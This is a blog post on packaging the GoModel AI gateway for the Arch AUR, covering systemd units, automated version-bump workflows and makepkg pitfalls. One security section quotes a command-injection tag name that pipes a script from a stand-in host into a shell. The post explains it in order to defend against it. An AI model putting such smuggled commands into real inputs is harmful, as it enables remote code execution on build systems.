---
title: "Packaging GoModel for Arch Linux"
description: "I wanted GoModel on Arch properly — so I built two AUR packages and an automation that never lets them go stale. Here's what worked and what fought back."
date: "2026-10-29"
tags: ["arch-linux", "packaging", "gomodel", "automation"]
draft: false
---

I've been running [GoModel](https://github.com/ENTERPILOT/GoModel) as my AI
gateway for a while now. It sits between my apps and the LLM providers —
caching responses so I don't pay twice for the same prompt, tracking where
my money actually goes, routing intelligently, one dashboard for all of
it. It speaks the OpenAI and Anthropic API dialects, so nothing in my
tooling had to change.

The only thing that bugged me: no Arch package. I live on CachyOS, and
"curl a shell script into /usr/local/bin" is not how I want software on
this machine. So I did what an Archer does — built the packages. Two of
them, live in the AUR now:

- [`gomodel`](https://aur.archlinux.org/packages/gomodel) — tracks upstream
  release tags. The stable one.
- [`gomodel-git`](https://aur.archlinux.org/packages/gomodel-git) — tracks
  upstream `main`, rebuilding essentially every few hours with a version
  like `0.1.109.r11.gc8cf3a6-1` that tells you exactly which commit you're
  getting.

```sh
yay -S gomodel        # or gomodel-git
```

The post-install message walks you through setup, but honestly it's one
line (system service, encryption key included):

```sh
sudo sh -c 'install -d -m 750 -o root -g gomodel /etc/gomodel; printf "GOMODEL_ENCRYPTION_KEY=%s\n" "$(openssl rand -base64 32)" > /etc/gomodel/env; chown root:gomodel /etc/gomodel/env; chmod 640 /etc/gomodel/env' && sudo systemctl enable --now gomodel
```

Health check on `localhost:8080/healthz`, dashboard on
`localhost:8080/admin/dashboard`. That's the whole setup.

## Why compile from source?

Fair question — upstream ships binaries. But their release binaries are
built with `CGO_ENABLED=0`, and Go's plugin system hard-requires cgo. No
cgo, no `.so` plugins, period. Since plugins were the point for me, the
packages build from source with cgo enabled. Bonus: the release package
just downloads upstream's prebuilt dashboard archive and verifies it
against upstream's own `checksums.txt`, so you don't need a Node toolchain
for the stable one.

## systemd, but the way it should be

I didn't want to wrap a binary and call it a day. Both packages ship real
units: a system service with `DynamicUser`, a strict sandbox
(`ProtectSystem=strict`, syscall filtering, the works) and state under
`/var/lib/gomodel`; and a user service that starts at login and reads its
secrets from `~/.config/gomodel/env`. The `gomodel` user comes from
`sysusers.d`, directory ownership from `tmpfiles.d`. No `install -o root`
hacks sprinkled through `package()`.

## Then I automated myself out of the loop

Here's the thing about AUR packages: publishing them is easy, *keeping
them current* is the actual job. Upstream moves fast, and a stale `-git`
package is an embarrassment. So I wired up three GitHub Actions workflows:

- **bump-release** (every 4 h): polls upstream's latest release. New tag?
  Recompute the checksums, open a PR.
- **bump-git-base** (every 3 h): git-describes upstream `main`, pins the
  `-git` package to that exact commit, opens a PR.
- **aur-sync**: on every merge, regenerates `.SRCINFO` inside a real Arch
  container and pushes the package to the AUR — but only if something
  actually changed, and never force-pushed.

The supply-chain story stays clean by design: when you install between
syncs, you build the exact commit the AUR is on — not whatever `main`
grew since. Releases are gated twice over, once by the human who cuts the
tag and once by checksum verification against upstream's `checksums.txt`.

## The parts that actually fought back

Because it's never as smooth as the diagram, three things cost me real
time:

**makepkg quietly rewrites your PKGBUILD.** If your package has a
`pkgver()` function, makepkg's `update_pkgver()` resets `pkgrel` to 1
whenever the version moves — including during `--printsrcinfo` runs in
CI. So there I was with a PKGBUILD saying `pkgrel=2` and an `.SRCINFO`
saying `pkgrel=1`. `paru` and `yay` read the `.SRCINFO`. Users never saw
the update. The fix: compare the generated `.SRCINFO` against what the
AUR currently has and restore your `pkgrel` when only the packaging
changed.

**`.SRCINFO` lies if you generate it without sources.** `pkgver()` needs
the git history to compute the describe-version. Generate `.SRCINFO` from
a bare directory and you happily publish a version that doesn't exist.

**Pin your git sources.** A `-git` package that clones `main` at build
time doesn't build the version it claims to. The bump workflow now writes
`#commit=<full-hash>` into the `source=` array alongside `pkgver`, so
what you install is byte-for-byte what everyone else installed — not
whatever landed five minutes ago.

Two more scars worth sharing, both about trusting nothing you don't
control:

**Never trust upstream tag names as shell input.** The bump workflows get
the latest version from the GitHub API and need it in a `sed` command. If
that string went in as `${{ steps.upstream.outputs.version }}` — GitHub
pastes it verbatim into the script before the shell even starts — a
compromised or weirdly-named tag like `0.1.110"; curl evil.sh | sh; #`
becomes remote code execution in the workflow. Instead the version enters
as an environment variable and has to pass a strict semver check
(`^[0-9]+\.[0-9]+\.[0-9]+$`) before anything runs. Wrong shape? The
workflow dies with an error. Only schema-conforming versions ever get
parsed; everything else fails closed.

## Links

- GoModel upstream: <https://github.com/ENTERPILOT/GoModel>
- Official docs: <https://gomodel.enterpilot.io/docs/>
- Providers overview: <https://gomodel.enterpilot.io/docs/providers/overview>
- AUR: <https://aur.archlinux.org/packages/gomodel> ·
  <https://aur.archlinux.org/packages/gomodel-git>
If you're on Arch and want a self-hosted AI gateway with plugin support,
the AUR packages are the shortest path — and they keep themselves fresh.
